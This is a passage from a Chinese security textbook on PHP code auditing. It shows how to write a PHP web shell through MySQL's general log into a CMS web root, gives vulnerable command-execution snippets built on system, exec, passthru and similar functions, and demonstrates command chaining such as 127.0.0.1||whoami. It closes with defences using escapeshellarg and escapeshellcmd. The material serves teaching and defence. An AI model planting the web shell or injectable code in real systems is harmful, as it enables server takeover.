l set global general_log_file=CONCAT("D:\\\\Program Files\\\\PhpStudy\\\\PHPTutorial\\\\WWW\\\\YzmCMS\\\\test.","php");#\u8BBE\u7F6EMySQL\u7684Log\u65E5\u5FD7\u6587\u4EF6\u540D\u79F0\u4E3Atest.php\r
\r
l select '<?php eval($_GET[cmd]);?>';#\u5199\u5165shell\r
\r
\u6267\u884C\u4E0A\u8FF0\u8BED\u53E5\uFF0C\u5219\u53EF\u5728\u7F51\u7AD9\u6839\u8DEF\u5F84\u4E0B\u751F\u6210test.php\u6587\u4EF6\u4E3AMySQL\u7684\u65E5\u5FD7\u6587\u4EF6\u3002\u7136\u540E\u5199\u5165\u6728\u9A6C\u6587\u4EF6<?php eval($_GET[cmd]);?>\uFF0C\u5982\u56FE6-18\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image362.jpg)\r
\r
\u56FE6-18 test.php\u6587\u4EF6\r
\r
\u901A\u8FC7\u6D4F\u89C8\u5668\u8BBF\u95EE\u8BE5\u65E5\u5FD7\u6587\u4EF6\uFF0C\u8F93\u5165\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/yzmcms/test.php?cmd=phpinfo();\u6D4F\u89C8\u5668\u6210\u529F\u8BBF\u95EE\u521B\u5EFA\u7684MySQL\u65E5\u5FD7\u6587\u4EF6test.php\uFF0C\u5E76\u8FDB\u884C\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u6253\u5370PHP\u4FE1\u606F\uFF0C\u5982\u56FE6-19\u6240\u793A\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image364.jpg)\r
\r
\u56FE6-19 \u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
## 6.3 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u6316\u6398\r
\r
\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u95EE\u9898\u5728\u4E8E\u5BF9\u5E38\u89C1\u654F\u611F\u51FD\u6570\u4F20\u53C2\u672A\u4E25\u683C\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u7528\u6237\u53EF\u901A\u8FC7\u53C2\u6570\u6784\u9020\u6076\u610F\u547D\u4EE4\u5E76\u6267\u884C\u3002\u8BE5\u6F0F\u6D1E\u5C06\u9020\u6210\u4FE1\u606F\u6CC4\u9732\u3001\u6076\u610F\u811A\u672C\u6CE8\u5165\u7B49\u5B89\u5168\u95EE\u9898\u3002\u672C\u8282\u5C06\u5BF9\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u8FDB\u884C\u8BE6\u7EC6\u4ECB\u7ECD\uFF0C\u9996\u5148\u5BF9\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\u8FDB\u884C\u4EE3\u7801\u6848\u4F8B\uFF0C\u7136\u540E\u4ECB\u7ECD\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u7684\u8FDE\u63A5\u7B26\u95EE\u9898\uFF0C\u6700\u540E\u4EE5Discuz1.5\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2018-14729\uFF09\u4E3A\u6848\u4F8B\u7ED9\u51FA\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u3002\r
\r
### 6.3.1 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u662F\u6307\u53EF\u4EE5\u6267\u884C\u7CFB\u7EDF\u6307\u4EE4\u7684\u6F0F\u6D1E\uFF08Windows\u7684cmd\u6307\u4EE4\u3001Linux\u7684bash\u6307\u4EE4\uFF09\uFF0C\u8BE5\u6F0F\u6D1E\u4EA7\u751F\u7684\u4E3B\u8981\u539F\u56E0\u662F\u5BF9\u4E8E\u4E00\u4E9B\u547D\u4EE4\u6267\u884C\u51FD\u6570\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u7528\u6237\u5C06\u6076\u610F\u547D\u4EE4\u6CE8\u5165\u5230\u670D\u52A1\u5668\u5185\u90E8\u6267\u884C\uFF0C\u5176\u5E38\u89C1\u7684\u547D\u4EE4\u6267\u884C\u51FD\u6570\u5305\u62EC\uFF1Asystem()\u3001exec()\u3001shell_exec()\u3001passthru()\u3001pcntl_exec()\u3001popen()\u3001proc_open()\u51FD\u6570\uFF0C\u9664\u6B64\u4E4B\u5916\uFF0C\u53CD\u5F15\u53F7\uFF08\`\uFF09\u4E5F\u53EF\u4EE5\u6267\u884C\u547D\u4EE4\uFF0C\u4E0D\u8FC7\u53CD\u5F15\u53F7\u65B9\u5F0F\u4E5F\u662F\u8C03\u7528\u7684shell_exec()\u51FD\u6570\u3002PHP\u6267\u884C\u547D\u4EE4\u662F\u7EE7\u627FWebServer\u7528\u6237\u7684\u6743\u9650\uFF0C\u8FD9\u4E2A\u7528\u6237\u4E00\u822C\u90FD\u6709\u6743\u9650\u5411Web\u76EE\u5F55\u5199\u6587\u4EF6\uFF0C\u53EF\u89C1\u8BE5\u6F0F\u6D1E\u7684\u5371\u5BB3\u6027\u76F8\u5F53\u5927\u3002\r
\r
### 6.3.2 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\r
\r
\u672C\u5C0F\u8282\u5C06\u5BF9\u5E38\u89C1\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u51FD\u6570\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09  system\u51FD\u6570\r
\r
\u8BE5\u51FD\u6570\u5C06\u6267\u884C\u4E00\u4E2A\u5916\u90E8\u5E94\u7528\u7A0B\u5E8F\u7684\u8F93\u5165\u5E76\u663E\u793A\u8F93\u51FA\u7ED3\u679C\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$a = $_GET['a'];\r
\r
system($a);?>\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u901A\u8FC7GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570a\uFF0C\u7136\u540E\u4F7F\u7528system\u51FD\u6570\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u3002\u5F53\u8F93\u5165\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/inject-labs/system.php?a=ipconfig\uFF0C\u547D\u4EE4\u6267\u884C\u7ED3\u679C\u5982\u56FE6-20\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image366.jpg)\r
\r
\u56FE6-20 system\u6267\u884C\u7ED3\u679C\r
\r
\uFF082\uFF09  shell_exec\u51FD\u6570\r
\r
\u8BE5\u51FD\u6570\u662FPHP\u7684\u5185\u7F6E\u51FD\u6570\uFF0C\u901A\u8FC7shell\u6267\u884C\u547D\u4EE4\u5E76\u4EE5\u5B57\u7B26\u4E32\u7684\u5F62\u5F0F\u8FD4\u56DE\u7ED3\u679C\u3002\u8BE5\u51FD\u6570\u5C06\u53EA\u63A5\u53D7\u5355\u4E2A\u53C2\u6570\uFF0C\u53C2\u6570\u4E3A\u8981\u6267\u884C\u7684\u6307\u4EE4\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$output = shell_exec($_GET['a']);\r
\r
echo "<pre>$output</pre>";?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u901A\u8FC7GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570a\uFF0C\u7136\u540E\u8F93\u51FAshell_exec\u51FD\u6570\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u3002\u5F53\u8F93\u5165\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/inject-labs/shellexec.php?a=ipconfig\uFF0C\u547D\u4EE4\u6267\u884C\u7ED3\u679C\u5982\u56FE6-21\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image368.jpg)\r
\r
\u56FE6-21 shell_exec\u6267\u884C\u7ED3\u679C\r
\r
\uFF083\uFF09  exec\u51FD\u6570\r
\r
\u8BE5\u51FD\u6570\u662FPHP\u7684\u5185\u7F6E\u51FD\u6570\uFF0C\u5176\u7528\u4E8E\u6267\u884C\u5916\u90E8\u7A0B\u5E8F\u3002exec()\u51FD\u6570\u9ED8\u8BA4\u4E0D\u8F93\u51FA\u7ED3\u679C\uFF0C\u53EA\u8FD4\u56DE\u8F93\u51FA\u7684\u6700\u540E\u4E00\u884C\uFF0C\u51FD\u6570\u5982\u679C\u6CA1\u6709\u6B63\u786E\u8FD0\u884C\u547D\u4EE4\uFF0C\u5219\u8FD4\u56DENULL\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$output = exec($_GET['a']);\r
\r
echo $output;?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u901A\u8FC7GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570a\u4E3Awhoami\uFF0C\u7136\u540E\u8F93\u51FAexec\u51FD\u6570\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u3002\u5F53\u8F93\u5165\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/inject-labs/exec.php?a=whoami\uFF0C\u547D\u4EE4\u6267\u884C\u7ED3\u679C\u5982\u4E0B\u56FE6-22\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image370.jpg)\r
\r
\u56FE6-22 exec\u6267\u884C\u7ED3\u679C\r
\r
\uFF084\uFF09  passthru\u51FD\u6570\r
\r
\u8BE5\u51FD\u6570\u5C06\u6267\u884C\u5916\u90E8\u547D\u4EE4\u540C\u65F6\u663E\u793A\uFF0C\u5176\u4E0D\u9700\u8981\u4F7F\u7528echo\u6216return\u6765\u67E5\u770B\u7ED3\u679C\uFF0C\u5176\u7ED3\u679C\u5C06\u76F4\u63A5\u5728\u6D4F\u89C8\u5668\u4E0A\u6253\u5370\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
if (get_magic_quotes_gpc())\r
\r
{$_REQUEST["cmd"]=stripslashes($_REQUEST["cmd"]);}\r
\r
print passthru($_REQUEST["cmd"]);?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u901A\u8FC7GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570a\u4E3Aipconfig\uFF0C\u7136\u540E\u8F93\u51FApassthru\u51FD\u6570\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u3002\u5F53\u8F93\u5165\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/inject-labs/newhack.php?cmd=ipconfig\uFF0C\u547D\u4EE4\u6267\u884C\u7ED3\u679C\u5982\u56FE6-23\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image372.jpg)\r
\r
\u56FE6-23 passthru\u6267\u884C\u7ED3\u679C\r
\r
\uFF085\uFF09  popen\u51FD\u6570\r
\r
popen\u51FD\u6570\u7528\u4E8E\u6253\u5F00\u8FDB\u7A0B\u6587\u4EF6\u6307\u9488\uFF0C\u5176\u4E3B\u8981\u7528\u6CD5\u4E3A\uFF1A\r
\r
resource popen(string $command, string $mode)\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php popen("echo 1 > test.txt","r");?>\r
\r
\r
\r
\u6267\u884C\u4E0A\u8FF0\u4EE3\u7801\u540E\uFF0C\u4F1A\u5728\u5F53\u524D\u6587\u4EF6\u5939\u4E0B\u521B\u5EFAtest.txt\u6587\u4EF6\u3002\u8BBF\u95EE\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/inject-labs/popen.php\u3002\u6267\u884C\u6210\u529F\u540E\u67E5\u770Btest.txt\u6587\u4EF6\u5982\u56FE6-24\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image374.jpg)\r
\r
\u56FE6-24 \u67E5\u770Btest.txt\u56FE\r
\r
\uFF086\uFF09  proc_popen\u51FD\u6570\r
\r
proc_open\u51FD\u6570\u7528\u4E8E\u6267\u884C\u4E00\u4E2A\u547D\u4EE4\uFF0C\u5E76\u4E14\u6253\u5F00\u7528\u6765\u8F93\u5165\u8F93\u51FA\u7684\u6587\u4EF6\u6307\u9488\u3002\u5176\u7528\u6CD5\u5982\u4E0B\uFF1A\r
\r
resource proc_open(string $cmd, array $descriptorspec, array &$pipes[, string $cwd[, array $env[, array $other_options]]])\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php $proc=proc_open("whoami",\r
\r
array(\r
\r
  array("pipe","r"),\r
\r
  array("pipe","w"),\r
\r
  array("pipe","w")\r
\r
),$pipes);\r
\r
print stream_get_contents($pipes[1]);?>\r
\r
\r
\r
\u6267\u884C\u4E0A\u8FF0\u4EE3\u7801\u540E\uFF0C\u4F1A\u6267\u884Cwhoami\u547D\u4EE4\u5E76\u663E\u793A\u7ED3\u679C\uFF0C\u8BBF\u95EE\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/inject-labs/proc_popen.php\u3002\u6267\u884Cphp\u4EE3\u7801\u540E\u5982\u56FE6-25\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image376.jpg)\r
\r
\u56FE6-25 proc_popen\u6267\u884C\u7ED3\u679C\r
\r
\uFF087\uFF09  \u53CD\u5355\u5F15\u53F7\r
\r
\u53CD\u5355\u5F15\u53F7\uFF08\`\uFF09\u662FPHP\u6267\u884C\u8FD0\u7B97\u7B26\uFF0CPHP\u5C06\u5C1D\u8BD5\u5C06\u53CD\u5355\u5F15\u53F7\u4E2D\u7684\u5185\u5BB9\u4F5C\u4E3Ashell\u547D\u4EE4\u6765\u6267\u884C\uFF0C\u5E76\u5C06\u5176\u8F93\u51FA\u4FE1\u606F\u8FD4\u56DE\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php echo \`whoami\`;?>\r
\r
\r
\r
\u6267\u884C\u4E0A\u8FF0\u4EE3\u7801\u540E\uFF0C\u4F1A\u6267\u884Cwhoami\u547D\u4EE4\u5E76\u663E\u793A\u7ED3\u679C\uFF0C\u8BBF\u95EE\u7684URL\u4E3A\uFF1Ahttp://192.168.0.11/inject-labs/fandanyinhao.php\u3002\u6267\u884Cphp\u4EE3\u7801\u5982\u56FE6-26\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image378.jpg)\r
\r
\u56FE6-26 \u53CD\u5F15\u53F7\u6267\u884C\u7ED3\u679C\r
\r
### 6.3.3 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u8FDE\u63A5\u7B26\r
\r
\uFF081\uFF09Windows\u8FDE\u63A5\u7B26\r
\r
Windows\u7CFB\u7EDF\u4E0B\u7684\u8FDE\u63A5\u7B26\u4E3B\u8981\u5305\u62EC\uFF1A&\u3001&&\u3001|\u3001||\u3002\u672C\u5C0F\u8282\u5C06\u5BF9\u547D\u4EE4\u6CE8\u5165\u6F0F\u6D1E\u5E38\u7528\u7684Windows\u8FDE\u63A5\u7B26\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u88686-1\u4E3AWindows\u8FDE\u63A5\u7B26\u8868\u3002\r
\r
\u88686-1 Windows\u8FDE\u63A5\u7B26\u8868\r
\r
| **\u8FDE\u63A5\u7B26** | **\u89E3\u91CA**                                                     |\r
| ---------- | ------------------------------------------------------------ |\r
| &          | &\u524D\u9762\u7684\u547D\u4EE4\u4E3A\u5047\u5219\u6267\u884C&\u540E\u7684\u547D\u4EE4\uFF0C&\u524D\u9762\u7684\u547D\u4EE4\u4E3A\u771F\u5219&\u524D\u540E\u7684\u8BED\u53E5\u90FD\u6267\u884C\u3002 |\r
| &&         | &&\u524D\u9762\u7684\u547D\u4EE4\u4E3A\u5047\u5219\u76F4\u63A5\u62A5\u9519\uFF0C&&\u524D\u9762\u7684\u547D\u4EE4\u4E3A\u771F\u5219\u524D\u540E\u547D\u4EE4\u90FD\u6267\u884C\u3002 |\r
| \\|         | \\|\u524D\u9762\u7684\u547D\u4EE4\u4E3A\u5047\u5219\u76F4\u63A5\u62A5\u9519\uFF0C\\|\u524D\u9762\u7684\u547D\u4EE4\u4E3A\u771F\u5219\u6267\u884C\\|\u540E\u9762\u7684\u547D\u4EE4\u3002 |\r
| \\|\\|       | \\|\\|\u524D\u9762\u7684\u8BED\u53E5\u4E3A\u5047\u5219\u6267\u884C\\|\\|\u540E\u9762\u7684\u8BED\u53E5\uFF0C\\|\\|\u524D\u9762\u7684\u8BED\u53E5\u4E3A\u771F\u5219\u53EA\u6267\u884C\\|\\|\u524D\u9762\u7684\u8BED\u53E5\u4E0D\u6267\u884C\\|\\|\u540E\u9762\u7684\u8BED\u53E5\u3002 |\r
\r
\u4E0B\u9762\u7ED9\u51FA\u4F7F\u7528\u6848\u4F8B\u3002\r
\r
\r
\r
**C:\\>aaa & whoami**\r
\r
'aaa' \u4E0D\u662F\u5185\u90E8\u6216\u5916\u90E8\u547D\u4EE4\uFF0C\u4E5F\u4E0D\u662F\u53EF\u8FD0\u884C\u7684\u7A0B\u5E8F\u6216\u6279\u5904\u7406\u6587\u4EF6\u3002\r
\r
an-pc\\an\r
\r
**C:\\>aaa && whoami**\r
\r
'aaa' \u4E0D\u662F\u5185\u90E8\u6216\u5916\u90E8\u547D\u4EE4\uFF0C\u4E5F\u4E0D\u662F\u53EF\u8FD0\u884C\u7684\u7A0B\u5E8F\u6216\u6279\u5904\u7406\u6587\u4EF6\u3002\r
\r
**C:\\>aaa | whoami**\r
\r
'aaa' \u4E0D\u662F\u5185\u90E8\u6216\u5916\u90E8\u547D\u4EE4\uFF0C\u4E5F\u4E0D\u662F\u53EF\u8FD0\u884C\u7684\u7A0B\u5E8F\u6216\u6279\u5904\u7406\u6587\u4EF6\u3002\r
\r
**C:\\>aaa || whoami**\r
\r
'aaa' \u4E0D\u662F\u5185\u90E8\u6216\u5916\u90E8\u547D\u4EE4\uFF0C\u4E5F\u4E0D\u662F\u53EF\u8FD0\u884C\u7684\u7A0B\u5E8F\u6216\u6279\u5904\u7406\u6587\u4EF6\u3002\r
\r
an-pc\\an\r
\r
\r
\r
\uFF082\uFF09Linux\u8FDE\u63A5\u7B26\r
\r
Linux\u7CFB\u7EDF\u4E0B\u7684\u8FDE\u63A5\u7B26\u4E3B\u8981\u5305\u62EC\uFF1A;\u3001&\u3001&&\u3001|\u3001||\u3002\u672C\u5C0F\u8282\u5C06\u5BF9\u547D\u4EE4\u6CE8\u5165\u6F0F\u6D1E\u5E38\u7528\u7684Linux\u8FDE\u63A5\u7B26\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u88686-2\u4E3ALinux\u8FDE\u63A5\u7B26\u8868\u3002\r
\r
\u88686-2 Linux\u8FDE\u63A5\u7B26\u8868\r
\r
| **\u8FDE\u63A5\u7B26** | **\u89E3\u91CA**                                                     |\r
| ---------- | ------------------------------------------------------------ |\r
| ;          | \u591A\u4E2A\u547D\u4EE4\u6309\u987A\u5E8F\u6267\u884C\uFF0C\u6240\u6709\u547D\u4EE4\u90FD\u4F1A\u6267\u884C\u3002                       |\r
| &          | &\u7684\u4F5C\u7528\u662F\u4F7F\u547D\u4EE4\u5728\u540E\u53F0\u8FD0\u884C\uFF0C\u8FD9\u6837\u5C31\u53EF\u4EE5\u540C\u65F6\u6267\u884C\u591A\u6761\u6307\u4EE4        |\r
| &&         | \u5982\u679C\u524D\u9762\u7684\u547D\u4EE4\u6267\u884C\u6210\u529F\uFF0C\u5219\u6267\u884C\u540E\u9762\u7684\u547D\u4EE4                     |\r
| \\|         | \u5C06\u524D\u9762\u7684\u547D\u4EE4\u8F93\u51FA\u4F5C\u4E3A\u540E\u9762\u7684\u547D\u4EE4\u7684\u8F93\u5165\uFF0C\u524D\u9762\u7684\u547D\u4EE4\u548C\u540E\u9762\u7684\u547D\u4EE4\u90FD\u4F1A\u6267\u884C\uFF0C\u4F46\u662F\u53EA\u663E\u793A\u540E\u9762\u7684\u547D\u4EE4\u7684\u6267\u884C\u7ED3\u679C\u3002 |\r
| \\|\\|       | \u7C7B\u4F3C\u4E8E\u7A0B\u5E8F\u4E2Dif else\u8BED\u53E5\uFF0C\u82E5\u524D\u9762\u7684\u547D\u4EE4\u6267\u884C\u6210\u529F\uFF0C\u5219\u540E\u9762\u7684\u547D\u4EE4\u5C31\u4E0D\u4F1A\u6267\u884C\uFF0C\u82E5\u524D\u9762\u7684\u547D\u4EE4\u6267\u884C\u5931\u8D25\u5219\u6267\u884C\u540E\u9762\u7684\u547D\u4EE4\u3002 |\r
\r
\u4E0B\u9762\u7ED9\u51FA\u4F7F\u7528\u6848\u4F8B\u3002\r
\r
\r
\r
**[root@localhost ~]# aaa;id**\r
\r
-bash: aaa: command not found\r
\r
uid=0(root) gid=0(root) groups=0(root)\r
\r
**[root@localhost ~]# aaa&id**\r
\r
[1] 1639 -bash: aaa: command not found\r
\r
uid=0(root) gid=0(root) groups=0(root)    [1]+ Exit 127    aaa\r
\r
**[root@localhost ~]# aaa&&id**\r
\r
-bash: aaa: command not found\r
\r
**[root@localhost ~]# aaa|id**\r
\r
-bash: aaa: command not found\r
\r
uid=0(root) gid=0(root) groups=0(root)\r
\r
**[root@localhost ~]# aaa||id**\r
\r
-bash: aaa: command not found\r
\r
uid=0(root) gid=0(root) groups=0(root)\r
\r
\r
\r
### 6.3.4 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u5BA1\u8BA1\u547D\u4EE4\u6307\u4EE4\u6F0F\u6D1E\u7684\u65B9\u6CD5\u901A\u5E38\u662F\u5BF9\u5E94\u7528\u7A0B\u5E8F\u4EE3\u7801\u8FDB\u884C\u5168\u5C40\u641C\u7D22\u4EE5\u4E0B\u51FD\u6570\uFF1Asystem()\u3001exec()\u3001shell_exec()\u3001passthru()\u3001pcntl_exec()\u3001popen()\u3001proc_open()\u7B49\u3002\u5F53\u540E\u53F0\u5E94\u7528\u8C03\u7528\u4E0A\u8FF0\u51FD\u6570\u6267\u884C\u7CFB\u7EDF\u811A\u672C\u65F6\uFF0C\u6781\u6709\u53EF\u80FD\u51FA\u73B0\u7F16\u7801\u758F\u5FFD\u800C\u5BFC\u81F4\u7684\u6B64\u7C7B\u6F0F\u6D1E\u3002\u7531\u4E8E\u8BE5\u6F0F\u6D1E\u7684\u7279\u5F81\u8F83\u4E3A\u660E\u663E\uFF0C\u53EF\u76F4\u63A5\u5168\u90E8\u641C\u7D22\u654F\u611F\u51FD\u6570\u5E76\u5206\u6790\u662F\u5426\u5B58\u5728\u53EF\u63A7\u53D8\u91CF\u5BFC\u81F4\u547D\u4EE4\u6267\u884C\u5373\u53EF\u3002\r
\r
### 6.3.5 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u9632\u5FA1\r
\r
\uFF081\uFF09  disable_functions\u914D\u7F6E\u9632\u5FA1\r
\r
\u901A\u8FC7PHP\u914D\u7F6E\u6587\u4EF6\u4E2D\u7684disable_functions\u7981\u7528\u654F\u611F\u51FD\u6570\u6765\u4FEE\u590D\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
\uFF082\uFF09  escapeshellarg\u51FD\u6570\r
\r
escapeshellarg\u51FD\u6570\u628A\u5B57\u7B26\u4E32\u8F6C\u7801\u4E3A\u53EF\u4EE5\u5728shell\u547D\u4EE4\u91CC\u4F7F\u7528\u7684\u53C2\u6570\uFF0C\u4EE5\u8FC7\u6EE4\u547D\u4EE4\u4E2D\u7684\u53C2\u6570\uFF0C\u5176\u7528\u6CD5\u5982\u4E0B\uFF1A\r
\r
string esacpeshellarg(string $arg)\r
\r
escapeshellarg\u51FD\u6570\u7ED9\u5B57\u7B26\u4E32\u589E\u52A0\u4E00\u4E2A\u5355\u5F15\u53F7\uFF0C\u5E76\u4E14\u80FD\u5F15\u7528\u6216\u8F6C\u4E49\u4EFB\u4F55\u5DF2\u7ECF\u5B58\u5728\u7684\u5355\u5F15\u53F7\uFF0C\u8FD9\u6837\u53EF\u4EE5\u76F4\u63A5\u5C06\u4E00\u4E2A\u5B57\u7B26\u4E32\u4F20\u5165shell\u51FD\u6570\uFF0C\u5E76\u4E14\u53EF\u4EE5\u786E\u4FDD\u5B83\u662F\u5B89\u5168\u7684\u3002\u5BF9\u4E8E\u7528\u6237\u8F93\u5165\u7684\u53C2\u6570\u5C31\u5E94\u7528\u4F7F\u7528\u8FD9\u4E2A\u51FD\u6570\u3002Shell\u51FD\u6570\u5305\u542Bexec()\uFF0Csystem()\u6267\u884C\u8FD0\u7B97\u7B26\u3002\r
\r
\u901A\u8FC7escapshellarg\u51FD\u6570\u5BF9\u793A\u4F8B\u4EE3\u7801\u8FDB\u884C\u4FEE\u590D\uFF1A\r
\r
\r
\r
<?php\r
\r
$ip = $_GET['ip'];\r
\r
system("ping -n 3 ".escapeshellarg($ip));?>\r
\r
\r
\r
  \u5F53\u8F93\u5165\u6B63\u5E38\u53C2\u6570\uFF0C\u53EF\u4EE5\u8FD4\u56DE\u6B63\u5E38\u7ED3\u679C\uFF0C\u5982\u56FE6-27\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image380.jpg)\r
\r
\u56FE6-27\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\u5F53\u8F93\u5165\u6076\u610F\u653B\u51FB\u53C2\u6570\uFF0C\u4E0D\u80FD\u6B63\u5E38\u8FD4\u56DE\u7ED3\u679C\uFF0C\u5982\u56FE6-28\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image382.jpg)\r
\r
\u56FE6-28 \u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF083\uFF09  escapeshellcmd\u51FD\u6570\r
\r
escapeshellcmd\u51FD\u6570\u53EF\u4EE5\u5BF9shell\u5143\u5B57\u7B26\u8FDB\u884C\u8F6C\u4E49\uFF0C\u8FC7\u6EE4\u547D\u4EE4\u3002\u5176\u7528\u6CD5\u5982\u4E0B\uFF1A\r
\r
string escapeshellcmd(string $command)\r
\r
escapeshellcmd\u51FD\u6570\u5BF9\u5B57\u7B26\u4E32\u4E2D\u4F1A\u6B3A\u9A97shell\u6267\u884C\u6076\u610F\u547D\u4EE4\u7684\u5B57\u7B26\u8FDB\u884C\u8F6C\u4E49\u3002\u6B64\u51FD\u6570\u4FDD\u8BC1\u7528\u6237\u8F93\u5165\u7684\u6570\u636E\u5728\u4F20\u9001\u5230system\u51FD\u6570\u6216\u8005\u6267\u884C\u64CD\u4F5C\u7B26\u4E4B\u524D\u88AB\u8F6C\u4E49\u3002\r
\r
escapeshellcmd\u51FD\u6570\u4F1A\u5728\u7279\u6B8A\u5B57\u7B26\u524D\u63D2\u5165\u53CD\u659C\u7EBF\uFF08\\\uFF09\uFF0C\u7279\u6B8A\u5B57\u7B26\u5305\u62EC\uFF1A&\u3001#\u3001; \u3001\`\u3001|\u3001*\u3001? \u3001~\u3001<\u3001>\u3001^\u3001(\u3001) \u3001[\u3001] \u3001{\u3001}\u3001$\u3001\\\u3001\\x0A\u548C\\xFF\u3002\u5728Windows\u5E73\u53F0\u4E0B\u6240\u6709\u5B57\u7B26\u4EE5\u53CA%\u548C!\u5B57\u7B26\u90FD\u5C06\u88AB\u7A7A\u683C\u4EE3\u66FF\u3002\r
\r
\u901A\u8FC7escapeshellcmd\u51FD\u6570\u5BF9\u793A\u4F8B\u4EE3\u7801\u8FDB\u884C\u4FEE\u590D\uFF1A\r
\r
\r
\r
<?php\r
\r
$ip = $_GET['ip'];\r
\r
system(escapeshellcmd("ping -n 3 ".$ip));?>\r
\r
\r
\r
\u5F53\u8F93\u5165\u6076\u610F\u653B\u51FB\u53C2\u6570\u4E3Aip=127.0.0.1||whoami\u65F6\uFF0C\u8BE5\u53C2\u6570\u5C06\u5728\u6267\u884C\u524D\u8F6C\u6362\u4E3Aip=127.0.0.1\\|\\|whoai\uFF0C\u5BFC\u81F4\u4E0D\u80FD\u6B63\u5E38\u8FD4\u56DE\u7ED3\u679C\uFF0C\u5982\u56FE6-29\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image384.jpg)\r
\r
\u56FE6-29 \u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
## 6.4 \u547D\u4EE4\u6267\u884C\u5BA1\u8BA1CMS\u5B9E\u8DF5\r
\r
### 6.4.1  \u5B9E\u9A8C\uFF1ADiscuz1.5\u547D\u4EE4\u6267\u884C\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
